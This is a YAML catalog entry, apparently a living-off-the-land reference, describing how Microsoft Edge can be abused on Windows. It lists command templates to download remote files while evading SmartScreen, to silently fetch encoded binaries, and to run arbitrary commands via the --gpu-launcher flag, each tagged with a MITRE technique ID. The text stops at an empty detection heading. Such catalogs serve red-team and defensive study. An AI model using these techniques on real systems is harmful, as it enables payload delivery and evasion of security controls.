      document_utf8: "---\nName: Msedge.exe\nDescription: Microsoft Edge browser\nAuthor: mr.d0x\nCreated:\
        \ 2022-01-20\nCommands:\n  - Command: msedge.exe {REMOTEURL:.exe.txt}\n    Description: Edge will\
        \ launch and download the file. A 'harmless' file extension (e.g. .txt, .zip) should be appended\
        \ to avoid SmartScreen.\n    Usecase: Download file from the internet\n    Category: Download\n\
        \    Privileges: User\n    MitreID: T1105\n    OperatingSystem: Windows 10, Windows 11\n  - Command:\
        \ msedge.exe --headless --enable-logging --disable-gpu --dump-dom \"{REMOTEURL:.base64.html}\"\
        \ > {PATH:.b64}\n    Description: Edge will silently download the file. File extension should\
        \ be .html and binaries should be encoded.\n    Usecase: Download file from the internet\n   \
        \ Category: Download\n    Privileges: User\n    MitreID: T1105\n    OperatingSystem: Windows 10,\
        \ Windows 11\n  - Command: msedge.exe --disable-gpu-sandbox --gpu-launcher=\"{CMD} &&\"\n    Description:\
        \ Edge spawns cmd.exe as a child process of msedge.exe and executes the specified command\n  \
        \  Usecase: Executes a process under a trusted Microsoft signed binary\n    Category: Execute\n\
        \    Privileges: User\n    MitreID: T1218.015\n    OperatingSystem: Windows 10, Windows 11\n \
        \   Tags:\n      - Execute: CMD\nFull_Path:\n  - Path: c:\\Program Files\\Microsoft\\Edge\\Application\\\
        msedge.exe\n  - Path: c:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe\nDetection:\n\
